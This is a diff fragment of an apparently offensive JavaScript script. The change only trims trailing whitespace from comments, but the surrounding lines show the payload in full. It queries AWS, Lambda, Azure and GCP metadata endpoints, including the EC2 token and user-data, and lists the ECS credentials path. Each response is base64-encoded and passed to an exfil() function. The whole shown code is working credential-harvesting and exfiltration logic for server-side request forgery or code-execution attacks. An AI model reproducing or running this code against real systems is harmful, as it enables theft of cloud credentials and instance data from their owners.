@@ -14,16 +14,16 @@ fetch('http://169.254.169.254/latest/user-data')
     .then(r => r.text())
     .then(r => { exfil('user_data', btoa(r)) });
 
-//aws ec2                                                                                                                                                                                                            
+//aws ec2
 fetch('http://169.254.169.254/latest/api/token', { method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } })
     .then(r => r.text())
     .then(r => { exfil('ec2', btoa(r)) });
 
-//aws ecs                                                                                                                                                                                                            
+//aws ecs
 //http://169.254.170.2/v2/credentials/<GUID>
 // $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 
-// aws lambda                                                                                                                                                                                                        
+// aws lambda
 fetch('http://localhost:9001/2018-06-01/runtime/invocation/next')
     .then(r => r.text())
     .then(r => { exfil('lambda_event', btoa(r)) });
@@ -38,7 +38,7 @@ fetch('http://169.254.169.254/metadata/instance?api-version=2021-12-13', { heade
     .then(r => r.text())
     .then(r => { exfil('azure', btoa(r)) });
 
-//gcp                                                                                                                                                                                                                
+//gcp
 fetch('http://metadata/computeMetadata/v1/project/project-id', { headers: { 'Metadata-Flavor': 'Google' } })
     .then(r => r.text())
     .then(r => { exfil('gcp_projid', btoa(r)) });
